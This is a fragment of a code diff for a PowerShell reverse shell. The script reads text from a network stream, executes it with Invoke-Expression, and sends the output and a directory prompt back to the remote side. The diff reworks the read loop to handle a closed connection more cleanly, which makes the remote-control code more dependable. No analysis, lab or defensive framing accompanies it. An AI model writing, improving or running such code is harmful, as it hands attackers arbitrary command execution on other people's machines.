@@ -7,7 +7,17 @@ $Stream.Write($successMessage, 0, $successMessage.Length)
 $currentDirectoryMessage = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + ' > ')
 $Stream.Write($currentDirectoryMessage, 0, $currentDirectoryMessage.Length)
 
-while (($bytesRead = $Stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
+$buffer = New-Object byte[] 1024
+$continueListening = $true
+
+while ($continueListening) {
+    $bytesRead = $Stream.Read($buffer, 0, $buffer.Length)
+    if ($bytesRead -eq 0) {
+        # Connection closed by the server
+        $continueListening = $false
+        break
+    }
+
     $receivedData = (New-Object System.Text.UTF8Encoding).GetString($buffer, 0, $bytesRead)
     $output = (Invoke-Expression $receivedData 2>&1 | Out-String) + (Get-Location).Path + '! '
     $outputBytes = ([text.encoding]::UTF8).GetBytes($output)
